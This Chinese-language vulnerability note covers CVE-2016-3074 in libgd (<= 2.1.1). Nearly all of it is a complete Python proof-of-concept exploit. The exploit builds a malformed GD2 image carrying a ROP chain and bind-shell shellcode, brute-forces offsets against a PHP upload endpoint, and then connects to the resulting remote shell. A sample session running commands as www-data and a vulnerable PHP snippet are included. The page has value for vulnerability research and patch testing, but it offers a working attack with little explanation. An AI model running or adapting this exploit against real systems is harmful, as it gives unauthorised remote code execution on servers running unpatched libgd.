# GD库漏洞

## CVE-2016-3074_命令执行漏洞

### 参考

- https://github.com/dyntopia/exploits/tree/master/CVE-2016-3074
- https://github.com/libgd/libgd/commit/2bb97f407c1145c850416a3bfbcc8cf124e68a19

（GD Graphics Library <= 2.1.1 (aka libgd or libgd2)）

### 测试

exp:

```python
#!/usr/bin/env python2
#
# PoC for CVE-2016-3074 targeting Ubuntu 15.10 x86-64 with php5-gd and
# php5-fpm running behind nginx.
#
# ,----
# | $ python exploit.py --bind-port 5555 http://1.2.3.4/upload.php
# | [*] this may take a while
# | [*] offset 912 of 10000...
# | [+] connected to 1.2.3.4:5555
# | id
# | uid=33(www-data) gid=33(www-data) groups=33(www-data)
# |
# | uname -a
# | Linux wily64 4.2.0-35-generic #40-Ubuntu SMP Tue Mar 15 22:15:45 UTC
# | 2016 x86_64 x86_64 x86_64 GNU/Linux
# |
# | dpkg -l|grep -E "php5-(fpm|gd)"
# | ii  php5-fpm       5.6.11+dfsg-1ubuntu3.1 ...
# | ii  php5-gd        5.6.11+dfsg-1ubuntu3.1 ...
# |
# | cat upload.php
# | <?php
# |     imagecreatefromgd2($_FILES["file"]["tmp_name"]);
# | ?>
# `----
#
# - Hans Jerry Illikainen
#
import sys
import os
import zlib
import socket
import threading
import argparse
import urlparse
from struct import pack

import requests

# non-optimized bindshell from binjitsu
#
# context(arch="amd64", os="linux")
# asm(shellcraft.bindsh(port, "ipv4"))
shellcode = [
    "\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x52\xba",
    "%(fam-and-port)s\x52\x6a\x10\x5a\x48\x89\xc5\x48\x89\xc7",
    "\x6a\x31\x58\x48\x89\xe6\x0f\x05\x6a\x32\x58\x48\x89\xef",
    "\x6a\x01\x5e\x0f\x05\x6a\x2b\x58\x48\x89\xef\x31\xf6\x99",
    "\x0f\x05\x48\x89\xc5\x6a\x03\x5e\x48\xff\xce\x78\x0b\x56",
    "\x6a\x21\x58\x48\x89\xef\x0f\x05\xeb\xef\x6a\x68\x48\xb8",
    "\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x6a\x3b\x58\x48\x89",
    "\xe7\x31\xf6\x99\x0f\x05"
]

gadgets = [
    "\x90" * 40,

    # [16]
    #
    # 0xb6eca2:  popfq
    # 0xb6eca3:  callq  *%rsp
    pack("<Q", 0xb6eca2),

    "%(pad)s",

    # [2]
    #
    # 0x4dbe8c:  add  $0xd8,%rsp
    # 0x4dbe93:  retq
    pack("<Q", 0x4dbe8c),

    "\x90" * 48,

    # [1]
    #
    # (gdb) x/x {void *}($rsp + 8)
    # 0x12d7d60:  0x9090909090909090
    #
    # 0xa91f35:  rex.WXB  pop %r14
    # 0xa91f37:  mov      $0x3,%bh
    # 0xa91f39:  pop      %rsp
    # 0xa91f3a:  retq
    pack("<Q", 0xa91f35),

    "\x90" * 152,

    # [0]
    #
    # (gdb) x/i $rip
    # => 0x7f91acf61f46:  callq  *0x70(%rax)
    #
    # (gdb) x/gx 0x432b80
    # 0x432b80:  0x0000000000547880
    #
    # (gdb) x/3i 0x0000000000547880
    # 0x547880:  push   %rbx
    # 0x547881:  mov    %rdi,%rbx
    # 0x547884:  callq  *0x20(%rdi)
    pack("<Q", 0x432b80 - 0x70),

    # [3]
    #
    # 0x463e2c:  pop  %rbx
    # 0x463e2d:  retq
    pack("<Q", 0x463e2c),

    # [7]
    #
    # 0x463b1d:  pop  %r12
    # 0x463b1f:  retq
    pack("<Q", 0x463b1d),

    # [4]
    #
    # 0x473053:  pop  %rax
    # 0x473054:  retq
    pack("<Q", 0x473053),

    # [6]
    #
    # 0xa8bc37:  push  %rdx
    # 0xa8bc38:  jmpq  *%rbx
    pack("<Q", 0xa8bc37),

    # [5]
    #
    # 0x7b2eaf:  mov   %r9,%rdx
    # 0x7b2eb2:  jmpq  *%rax
    pack("<Q", 0x7b2eaf),

    # [8]
    #
    # 0x552768:  mov  %rdi,%rax
    # 0x55276b:  retq
    pack("<Q", 0x552768),

    # [9]
    #
    # 0x463e2c:  pop  %rbx
    # 0x463e2d:  retq
    pack("<Q", 0x463e2c),
    pack("<Q", 0xfffff000),

    # [10]
    #
    # 0xb6c734:  and  %ebx,%eax
    # 0xb6c736:  es retq
    pack("<Q", 0xb6c734),

    # [11]
    #
    # 0x4c93e9:  xchg  %eax,%ebx
    # 0x4c93ea:  retq
    pack("<Q", 0x4c93e9),

    # [12]
    #
    # 0x406a08:  pop  %rcx (len, 0x5555)
    # 0x406a09:  retq
    pack("<Q", 0x406a08),
    pack("<Q", 0x5555),

    # [13]
    #
    # 0xaf58fd:  pop  %rdx (PROT_READ|PROT_WRITE|PROT_EXEC)
    # 0xaf58fe:  retq
    pack("<Q", 0xaf58fd),
    pack("<Q", 7),

    # [14]
    #
    # 0x473053:  pop  %rax (mprotect)
    # 0x473054:  retq
    pack("<Q", 0x473053),
    pack("<Q", 125),

    # [15]
    #
    # 0x53f9f8:  int    $0x80
    # 0x53f9fa:  mov    0x38(%r12),%rsi
    # 0x53f9ff:  mov    $0x8f,%edi
    # 0x53fa04:  callq  *0x28(%r12)
    pack("<Q", 0x53f9f8),

    "\x90" * 100,
]

# gd.h: #define gdMaxColors 256
gd_max_colors = 256

def make_gd2(chunks):
    gd2 = [
        "gd2\x00",                    # signature
        pack(">H", 2),                # version
        pack(">H", 1),                # image size (x)
        pack(">H", 1),                # image size (y)
        pack(">H", 0x40),             # chunk size (0x40 <= cs <= 0x80)
        pack(">H", 2),                # format (GD2_FMT_COMPRESSED)
        pack(">H", 1),                # num of chunks wide
        pack(">H", len(chunks))       # num of chunks high
    ]
    colors = [
        pack(">B", 0),                # trueColorFlag
        pack(">H", 0),                # im->colorsTotal
        pack(">I", 0),                # im->transparent
        pack(">I", 0) * gd_max_colors # red[i], green[i], blue[i], alpha[i]
    ]

    offset = len("".join(gd2)) + len("".join(colors)) + len(chunks) * 8
    for data, size in chunks:
        gd2.append(pack(">I", offset)) # cidx[i].offset
        gd2.append(pack(">I", size))   # cidx[i].size
        offset += size

    return "".join(gd2 + colors + [data for data, size in chunks])

def connect(host, port):
    addr = socket.gethostbyname(host)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((addr, port))
    except socket.error:
        return

    print("\n[+] connected to %s:%d" % (host, port))
    if os.fork() == 0:
        while True:
            try:
                data = sock.recv(8192)
            except KeyboardInterrupt:
                sys.exit("\n[!] receiver aborting")
            if data == "":
                sys.exit("[!] receiver aborting")
            sys.stdout.write(data)
    else:
        while True:
            try:
                cmd = sys.stdin.readline()
            except KeyboardInterrupt:
                sock.close()
                sys.exit("[!] sender aborting")
            sock.send(cmd)

def get_payload(offset, port):
    rop = "".join(gadgets) % {"pad": "\x90" * offset}

    fam_and_port = pack("<I", (socket.AF_INET | (socket.htons(port) << 16)))
    sc = "".join(shellcode) % {"fam-and-port": fam_and_port}

    return rop + sc

def get_args():
    p = argparse.ArgumentParser()
    p.add_argument("--threads", type=int, default=20)
    p.add_argument("--bind-port", type=int, default=8000)
    p.add_argument("--offsets", type=int, default=[0, 10000], nargs=2)
    p.add_argument("url")
    return p.parse_args()

def send_gd2(url, gd2, code):
    files = {"file": gd2}
    try:
        req = requests.post(url, files=files, timeout=5)
        code.append(req.status_code)
    except requests.exceptions.ReadTimeout:
        pass

def main():
    args = get_args()
    host = urlparse.urlparse(args.url).netloc.split(":")[0]

    print("[*] this may take a while")
    for i in range(args.offsets[0], args.offsets[1]):
        sys.stdout.write("\r[*] offset %d of %d..." % (i, args.offsets[1]))
        sys.stdout.flush()

        valid = zlib.compress("A" * 100, 0)
        payload = get_payload(i, args.bind_port)
        gd2 = make_gd2([(valid, len(valid)), (payload, 0xffffffff)])

        threads = []
        code = []
        for _ in range(args.threads):
            t = threading.Thread(target=send_gd2, args=(args.url, gd2, code))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        if 404 in code:
            sys.exit("\n[-] 404: %s" % args.url)
        connect(host, args.bind_port)

    print("\n[-] nope...")

if __name__ == "__main__":
    main()
```

demo
```php
<?php
    imagecreatefromgd2($_FILES["file"]["tmp_name"]);
?>
```